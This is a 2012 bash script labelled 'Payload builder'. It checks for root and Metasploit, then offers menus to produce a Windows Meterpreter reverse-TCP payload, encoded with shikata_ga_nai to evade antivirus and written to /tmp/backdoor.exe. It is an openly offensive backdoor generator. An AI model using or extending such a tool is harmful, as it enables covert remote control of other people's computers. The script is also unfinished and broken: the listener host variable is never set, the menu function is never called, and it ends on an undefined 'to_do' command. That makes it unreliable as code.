#!/usr/bin/env bash
############################################################################
#                       COPYRIGHT t193r (2012)                             #
############################################################################
# This program is free software: you can redistribute it and/or modify     #
# it under the terms of the GNU General Public License as published by     #
# the Free Software Foundation, either version 3 of the License, or        #
# (at your option) any later version.                                      #
#                                                                          #
# This program is distributed in the hope that it will be useful,          #
# but WITHOUT ANY WARRANTY; without even the implied warranty of           #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            #
# GNU General Public License for more details.                             #
#                                                                          #
# You should have received a copy of the GNU General Public License        #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.    #
############################################################################

### Variable ###
ver="0.1"
### End of Variable ###

### Functions ###

check_privilege(){
	if [ `id | awk -F "=" {'print $2'} | awk -F "(" {'print $1'}` == "0" ]; then
		echo "Good.. You have root permission.."
	else
		echo "Damn.. Give me root permission!!"
		exit 0
	fi
}

check_dependencies(){
	echo "Checking metasploit"
	if [ `dpkg -l | grep framework3 | awk {'print $1'}` == "ii" ]; then
		echo "Good.. You have metasploit installed.. :)"
	else
		echo "Damn... No metasploit found on your system :("
		echo "Install metasploit first, then execute this script again.."
		exit 0
	fi
}

check_msf_path(){
	echo "Let me find your msf binary path. This wont take a long time.."
	sleep 1
	echo "Your msf binary path has been found in $(which msfpayload | sed 's/msfpayload//g') directory!"
	sleep 1
}

choose_payload(){
	echo "1. Windows"
	echo "2. Linux"
	echo "3. MacOS"
	echo "4. PHP"
	echo -ne "Choose your target (1-4) : "
	read os_target
	if [[ $os_target == "1" ]]; then
		echo "Windows has been selected as target. Proceed to next step"
		os=windows
		sleep 1; clear
		echo "1. Meterpreter aka metasploit interpreter"
		echo "2. Shell aka Windows Command Prompt"
		echo "3. VNC Inject aka Remote Desktop"
		echo "Choose your module (1-3) : "
		read module_target
		if [[ $module_target == "1" ]]; then
			echo "Meterpreter has been selected as your module. Proceed to next step"
			module=meterpreter
			sleep 1; clear
			echo "1. Reverse TCP aka back connect"
			echo "2. Bind TCP aka backdoor port"
			echo -ne "Choose your connection method (1-2) : "
			read connection_method_target
			if [[ $connection_method_target == "1" ]]; then
				echo "Reverse connection has been selected as your connection method. Proceed to next step"
				connection_method=reverse_tcp
				sleep 1; clear
				echo "1. Edit port listener"
				echo "2. Proceed to build my payload"
				echo -ne "Choose, what sould we do now (1-2) : "
				read option
				if [[ $option == "1" ]]; then
					echo "Editing port listener.."
					sleep 1
					echo -ne "Type where should our payload will listen to : "
					read port
					echo "Port $port has been configured. Proceed to build our payload..."
					echo "You payload is $os/$module/$connection_method/. Gonna make this payload"
					echo -ne "Wait. Do you want to include msfencode in this build? (Y/N)"
					read include_msfencode
					if [[ $include_msfencode == "Y" || $include_msfencode == "y" ]]; then
						echo "Gonna include x86/shikata_ga_nai in this payload..."
						echo "Building payload.. This may take some minutes.. Even hours!! LoL, just kidding..."
						echo "Now launching msfpayload and msfencode!"
						echo "Reading perimeter..."
						sleep 1
						msfpayload $os/$module/$connection_method LPORT=$port LHOST=$lhost R | msfencode -e x86/shikata_ga_nai -c 8 -t exe -o /tmp/backdoor.exe
					fi
				fi
			fi

		fi
	fi

}

### End of Functions ###

echo "Payload builder $ver"
echo "Checking dependencies... This may take several minutes..."
sleep 1
check_dependencies
echo "Checking privileges..."
sleep 1
check_privilege
to_do
